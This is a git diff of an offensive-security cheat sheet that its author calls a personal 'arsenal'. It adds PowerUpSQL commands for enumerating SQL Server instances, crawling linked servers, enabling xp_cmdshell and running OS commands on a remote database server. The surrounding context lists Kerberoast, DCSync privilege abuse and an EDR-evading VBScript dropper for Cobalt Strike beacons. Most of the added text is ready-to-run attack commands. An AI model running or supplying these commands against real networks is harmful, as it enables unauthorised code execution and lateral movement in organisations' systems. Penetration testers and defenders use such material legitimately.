@@ -25,7 +25,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Targeted Kerberoast](#targeted-kerberoast)
 	* [Add DCsync privilege to object](#add-dcsync-to-object)
 	* [Add Users to Group](#add-users-to-group)
-* **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)
+* **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)**
+	* [Get SQL Instances](#get-sql-instances)
+	* [Get SQL Linked Server](#get-sql-linked-server)
+	* [Execute SQL Query and OS Command](#execute-sql-query-and-os-command)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
@@ -164,7 +167,36 @@ Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity stu
 ```
 
 ## SQL Server Enumeration and Code Execution
-//add here
+### Get SQL Instances
+This method will allow you to enumerate local or domain sql servers(if any).
+```
+# Get Local Instance
+Get-SQLInstanceLocal -Verbose
+
+# Get Domain Instance
+Get-SQLInstanceDomain -Verbose
+```
+### Get SQL Linked Server
+This command will allow you to enumerate linked sql server to selected instance. Output of the command also shows privilege that you currently have on specific sql server
+```
+# Enumerate Linked Server (show just instace and priv)
+Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local
+
+# Enumerate Linked Server and Execute SQL Query
+Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local -Query 'exec master..xp_cmdshell ''whoami'''
+```
+### Execute Remote SQLQuery
+_Prerequisite:_
+	* Make sure you are **sa** user (high privileged user)
+	* Make sure to enable `xp_cmdshell` before executing os command
+```
+# Enable xp_cmdshell
+Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'
+
+# Execute OS command
+Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
+Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
+```
 
 ## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
